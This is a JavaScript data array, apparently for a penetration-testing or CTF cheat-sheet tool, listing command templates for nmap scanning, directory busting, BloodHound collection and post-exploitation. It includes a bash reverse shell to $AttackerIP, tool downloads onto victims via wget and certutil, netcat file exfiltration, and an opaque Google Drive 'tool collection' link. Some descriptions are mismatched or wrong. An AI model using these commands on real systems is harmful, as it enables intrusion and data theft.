const commandsData = [
            {
                category: "Name Resolution",
                commands: [
                    { title: "/etc/host", description: "Run this to register local DNS.", template: "echo '$VictimIP $Domain' | sudo tee -a /etc/hosts" },
                    { title: "/etc/resolv.conf", description: "Run this to register the DNS server. Might need to delete", template: "printf 'search localdomain\\nnameserver $VictimIP' | sudo tee -a /etc/resolv.conf" },
                ]
            },
            {
                category: "Nmap",
                commands: [
                    { title: "Basic Scan", description: "A simple yet effective scan to find open ports and identify services.", template: "nmap -sCV -T4 $VictimIP" },
                    { title: "All Ports Scan", description: "Scans all 65,535 TCP ports. Can be slow, but is very thorough.", template: "nmap -p- -sCV -T4 $VictimIP" },
                    { title: "UDP Scan", description: "Scans for open UDP ports. Often overlooked in initial scans.", template: "nmap -sU --top-ports 20 $VictimIP" },
                    { title: "Aggressive Scan", description: "Enables OS detection, version detection, script scanning, and traceroute.", template: "nmap $VictimIP" },
                ]
            },
            {
                category: "Useful Commands",
                commands: [
                    { title: "My Tool Collection", description: "Just my own Tool Collection. Might update once in a while", template: "https://drive.usercontent.google.com/download?id=1T00NujmQEiW42V7LBa7Sfo7jwemeBztK&export=download&authuser=0" },
                    { title: "Reverse Shell Listener", description: "Sets up a listener on your attacker machine to catch an incoming reverse shell.", template: "rlwrap nc -nlvp $Port" },
                    { title: "Simple Bash Reverse Shell", description: "Execute this on the victim machine to send a shell back to your listener.", template: "bash -c 'bash -i >& /dev/tcp/$AttackerIP/$Port 0>&1'" },
                    { title: "Python Server", description: "To share files in simple way.", template: "python3 -m http.server 8000" },
                    { title: "Download from Linux", description: "Upload tools to victim Linux machine", template: "wget http://$AttackerIP/path/to/file" },
                    { title: "Download from Windows", description: "Upload tools to victim Windows machine", template: "certutil.exe -urlcache -f -split http://$AttackerIP/path/to/file filename" },
                    { title: "Upload from Victim (Attacker)", description: "Create a listener in Attacker Machine", template: "nc -l -p $port -q 1 > file.zip < /dev/null" },
                    { title: "Upload from Victim (Victim)", description: "Upload data from Victim Machine to Attacker Machine by using netcat.", template: "cat file.zip | netcat $AttackerIP $port" },
                    { title: "Search (Linux)", description: "Find a file in linux", template: "find ~ -name '*.txt'" },
                    { title: "Search (Windows)", description: "Find a file in linux", template: "dir *.txt /s /b" },
                ]
            },
            {
                category: "Directory Busting",
                commands: [
                    { title: "Gobuster", description: "Find hidden directories on a web server using a wordlist.", template: "gobuster dir -u http://$VictimIP -w $Wordlist" },
                    { title: "File Busting with Extensions", description: "Look for subdomains of webserver. Use -fs to blacklist Size and -fc to Blacklist ports", template: "gobuster dir -u http://$VictimIP -w $Wordlist -x php,txt,sh" },
                    { title: "Subdomain enumeration", description: "Look for specific file types (e.g., php, txt, sh) on a web server.", template: "ffuf -u http://$Domain -w $Wordlist -H 'Host:FUZZ.$Domain'" },
                ]
            },
            {
                category: "BloodHound",
                commands: [
                    { title: "BloodHound Ingestor", description: "Run this on a compromised machine within an AD environment to collect data. Requires a domain user's credentials.", template: "./bloodhound.py -u USERNAME -p 'PASSWORD' -ns $VictimIP -d DOMAIN.LOCAL -c all" },
                ]
            },
        ];